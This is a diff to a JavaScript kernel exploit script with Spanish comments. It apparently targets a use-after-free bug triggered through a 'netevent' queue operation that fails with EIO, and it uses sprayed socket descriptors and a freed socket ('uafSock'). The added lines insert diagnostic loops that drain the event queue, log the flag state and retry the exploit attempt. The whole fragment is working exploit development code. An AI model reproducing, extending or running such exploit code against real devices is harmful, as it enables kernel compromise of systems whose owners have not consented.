@@ -452,6 +452,17 @@ let committed = false, rebootRequired = false;
                  + " rv=" + reg2.rv
                  + (reg2.rv === -1 ? " errno=" + reg2.err : "")
                  + " fl_post=" + flPostSet2);
+            // Diagnóstico: drenar la cola y ver cuántos CLEARs hacen falta
+            for (let i = 0; i < 4; ++i) {
+                const clr = netevent(dummy, NETEVENT_CLEAR_QUEUE);
+                const flClr = flGet(dummy);
+                mark("DRAIN-" + i, "rv=" + clr.rv
+                    + (clr.rv === -1 ? " errno=" + clr.err : "")
+                    + " fl_post=" + flClr);
+                if (clr.rv === -1) break;
+            }
+            const flEnd = flGet(dummy);
+            mark("DRAIN-END", "fl=" + flEnd);
 
             // El bug sólo se dispara si SET2 devuelve -1/EIO
             if (!(reg2.rv === -1 && reg2.err === 5)) {
@@ -533,6 +544,11 @@ let committed = false, rebootRequired = false;
 
             if (!partner) {
                 mark("ATTEMPT-RETRY", "after=no-alias next=" + (attempt + 1));
+            // Drenar la cola antes del siguiente intento
+            for (let i = 0; i < 4; ++i) {
+                const dr = netevent(dummy, NETEVENT_CLEAR_QUEUE);
+                if (dr.rv === -1) break;
+            }                
                 for (const s of sprayFds) sc(SYS.close, s);
                 sc(SYS.close, uafSock);
                 continue;
